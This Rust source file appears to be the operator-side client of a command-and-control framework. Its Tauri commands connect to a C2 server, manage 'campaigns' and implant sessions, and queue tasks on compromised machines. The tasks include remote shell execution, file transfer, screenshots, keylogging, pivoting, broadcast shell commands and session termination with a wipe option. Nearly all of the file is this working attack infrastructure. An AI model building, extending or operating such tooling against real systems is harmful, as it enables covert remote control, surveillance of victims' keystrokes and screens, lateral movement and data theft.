use crate::state::{AppState, Event};
use crate::grpc_client::proto::*;
use tauri::{State, Manager, Window};
use tokio::sync::mpsc::Receiver;

// Connection Management
#[tauri::command]
pub async fn connect_to_server(
    state: State<'_, AppState>,
    address: String,
    operator_id: String,
    client_cert: Option<String>,
    client_key: Option<String>,
    ca_cert: Option<String>,
) -> Result<bool, String> {
    let client = crate::grpc_client::GrpcClient::connect(
        &address,
        operator_id.clone(),
        client_cert.map(|s| s.into()),
        client_key.map(|s| s.into()),
        ca_cert.map(|s| s.into()),
    ).await.map_err(|e| e.to_string())?;
    
    // Update config
    {
        let mut config = state.config.lock();
        config.server_address = address;
        config.operator_id = operator_id;
    }
    
    state.set_client(Some(client)).await;
    Ok(true)
}

#[tauri::command]
pub async fn disconnect(state: State<'_, AppState>) -> Result<(), String> {
    state.set_client(None).await;
    Ok(())
}

#[tauri::command]
pub async fn get_connection_status(state: State<'_, AppState>) -> bool {
    state.get_client().await.is_some()
}

// Campaign Operations
#[tauri::command]
pub async fn list_campaigns(state: State<'_, AppState>) -> Result<Vec<Campaign>, String> {
    let mut client = state.get_client().await.ok_or("Not connected")?;
    client.list_campaigns().await.map_err(|e| e.to_string())
}

#[tauri::command]
pub async fn create_campaign(
    state: State<'_, AppState>,
    name: String,
    description: Option<String>,
) -> Result<Campaign, String> {
    let mut client = state.get_client().await.ok_or("Not connected")?;
    client.create_campaign(name, description).await.map_err(|e| e.to_string())
}

#[tauri::command]
pub async fn control_campaign(
    state: State<'_, AppState>,
    campaign_id: String,
    action: String,
) -> Result<bool, String> {
    let mut client = state.get_client().await.ok_or("Not connected")?;
    
    let action = match action.as_str() {
        "start" => CampaignAction::Start,
        "pause" => CampaignAction::Pause,
        "close" => CampaignAction::Close,
        "archive" => CampaignAction::Archive,
        _ => return Err("Invalid action".to_string()),
    };
    
    client.control_campaign(campaign_id, action).await.map_err(|e| e.to_string())
}

#[tauri::command]
pub async fn get_campaign_details(
    state: State<'_, AppState>,
    campaign_id: String,
) -> Result<CampaignDetails, String> {
    let mut client = state.get_client().await.ok_or("Not connected")?;
    client.get_campaign_details(campaign_id).await.map_err(|e| e.to_string())
}

// Session Operations
#[tauri::command]
pub async fn list_sessions(
    state: State<'_, AppState>,
    campaign_id: String,
) -> Result<Vec<Session>, String> {
    let mut client = state.get_client().await.ok_or("Not connected")?;
    client.list_sessions(campaign_id).await.map_err(|e| e.to_string())
}

#[tauri::command]
pub async fn terminate_session(
    state: State<'_, AppState>,
    session_id: String,
    wipe: bool,
) -> Result<bool, String> {
    let mut client = state.get_client().await.ok_or("Not connected")?;
    client.terminate_session(session_id, wipe).await.map_err(|e| e.to_string())
}

// Task Operations
#[tauri::command]
pub async fn create_task(
    state: State<'_, AppState>,
    campaign_id: String,
    session_id: String,
    task_type: String,
    payload: Vec<u8>,
    timeout: u32,
) -> Result<u64, String> {
    let mut client = state.get_client().await.ok_or("Not connected")?;
    
    let task_type = match task_type.as_str() {
        "shell" => TaskType::ShellExec,
        "upload" => TaskType::FileUpload,
        "download" => TaskType::FileDownload,
        "ps" => TaskType::ProcessList,
        "screenshot" => TaskType::Screenshot,
        "keylog_start" => TaskType::KeylogStart,
        "keylog_stop" => TaskType::KeylogStop,
        "pivot" => TaskType::PivotSetup,
        "self_destruct" => TaskType::SelfDestruct,
        _ => return Err("Invalid task type".to_string()),
    };
    
    client.create_task(campaign_id, session_id, task_type, payload, timeout)
        .await
        .map_err(|e| e.to_string())
}

#[tauri::command]
pub async fn create_broadcast_task(
    state: State<'_, AppState>,
    campaign_id: String,
    session_ids: Vec<String>,
    task_type: String,
    payload: Vec<u8>,
    timeout: u32,
) -> Result<Vec<u64>, String> {
    let mut client = state.get_client().await.ok_or("Not connected")?;
    
    let task_type = match task_type.as_str() {
        "shell" => TaskType::ShellExec,
        "ps" => TaskType::ProcessList,
        "screenshot" => TaskType::Screenshot,
        _ => return Err("Invalid broadcast task type".to_string()),
    };
    
    client.create_broadcast_task(campaign_id, session_ids, task_type, payload, timeout)
        .await
        .map_err(|e| e.to_string())
}

#[tauri::command]
pub async fn get_task_result(
    state: State<'_, AppState>,
    task_id: u64,
) -> Result<TaskResult, String> {
    let mut client = state.get_client().await.ok_or("Not connected")?;
    client.get_task_result(task_id).await.map_err(|e| e.to_string())
}

// Event Streaming
#[tauri::command]
pub async fn subscribe_events(
    state: State<'_, AppState>,
    window: Window,
    campaign_id: String,
) -> Result<(), String> {
    let mut client = state.get_client().await.ok_or("Not connected")?;
    let mut rx = client.subscribe_events(campaign_id).await.map_err(|e| e.to_string())?;
    
    // Store receiver in state
    *state.event_stream.write().await = Some(rx);
    
    // Spawn event forwarder
    let window_clone = window.clone();
    tokio::spawn(async move {
        while let Some(event) = state.event_stream.write().await.as_mut().unwrap().recv().await {
            let _ = window_clone.emit("c2-event", event);
        }
    });
    
    Ok(())
}

// Quick Actions
#[tauri::command]
pub async fn execute_shell(
    state: State<'_, AppState>,
    campaign_id: String,
    session_id: String,
    command: String,
) -> Result<u64, String> {
    create_task(
        state,
        campaign_id,
        session_id,
        "shell".to_string(),
        command.into_bytes(),
        60,
    ).await
}

#[tauri::command]
pub async fn get_system_info(
    state: State<'_, AppState>,
    campaign_id: String,
    session_id: String,
) -> Result<u64, String> {
    create_task(
        state,
        campaign_id,
        session_id,
        "ps".to_string(),
        vec![],
        30,
    ).await
}